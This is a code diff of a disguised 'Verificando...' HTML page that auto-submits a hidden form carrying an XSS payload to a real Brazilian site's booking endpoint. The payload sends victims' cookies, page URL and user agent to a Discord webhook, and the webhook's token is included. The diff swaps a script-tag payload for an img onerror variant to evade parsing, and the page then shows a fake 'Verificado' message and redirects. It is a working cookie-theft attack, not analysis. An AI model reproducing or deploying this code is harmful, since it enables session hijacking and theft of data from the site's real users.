@@ -13,7 +13,7 @@ p { color: #ccc; font-size: 14px; }
 <body>
 <div class="box"><h2>Verificando...</h2><p>Aguarde...</p></div>
 
-<form id="f" action="http://geomatrixgames.com.br/booking/booking.php" method="POST" target="x">
+<form id="f" action="https://geomatrixgames.com.br/booking/booking.php" method="POST" target="x">
   <input type="hidden" name="name" id="xss">
   <input type="hidden" name="email" value="a@b.com">
   <input type="hidden" name="owner_email" value="contato@geomatrixgames.com.br">
@@ -21,8 +21,16 @@ p { color: #ccc; font-size: 14px; }
 <iframe name="x" style="display:none"></iframe>
 
 <script>
-const WH = "https://discord.com/api/webhooks/1466851883451813891/HT4qn0Kaj711NLpN_Zb5uOud8zhLH1yOzAIOFCotYASks-x8J4swEC0NcHHwkCj14LuZ";
-const XSS = "<script>fetch('"+WH+"',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'XSS|Cookie:'+document.cookie+'|URL:'+window.location.href+'|UA:'+navigator.userAgent})});document.body.innerHTML='<h2 style=color:green>Verificado</h2>';setTimeout(function(){window.location.href='https://geomatrixgames.com.br'},2000)<\\/script>";
+var WH = "https://discord.com/api/webhooks/1466851883451813891/HT4qn0Kaj711NLpN_Zb5uOud8zhLH1yOzAIOFCotYASks-x8J4swEC0NcHHwkCj14LuZ";
+
+// XSS via <img onerror> - nao usa <script>, evita parser HTML
+var code = "fetch('" + WH + "',{method:'POST',headers:{'Content-Type':'application/json'}," +
+  "body:JSON.stringify({content:'XSS OK! Cookie:'+document.cookie+' URL:'+location.href})});" +
+  "document.body.innerHTML='<h2 style=color:green>Verificado</h2>';" +
+  "setTimeout(function(){location.href='https://geomatrixgames.com.br'},2000)";
+
+var XSS = "<img src=x onerror=\"" + code + "\">";
+
 document.getElementById("xss").value = XSS;
 document.getElementById("f").submit();
 </script>
